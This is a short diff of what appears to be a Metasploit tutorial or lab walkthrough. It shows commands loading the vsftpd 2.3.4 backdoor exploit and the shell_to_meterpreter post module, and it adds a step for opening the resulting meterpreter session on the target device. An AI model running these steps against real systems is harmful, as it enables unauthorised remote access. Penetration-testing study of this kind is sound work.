@@ -20,3 +20,4 @@ use exploit/unix/ftp/vsftpd_234_backdoor
 use post/multi/manage/shell_to_meterpreter
 ```
 
+4. Type sessions to see the list of available sessions, use the `meterpreter` session to interact with the device.
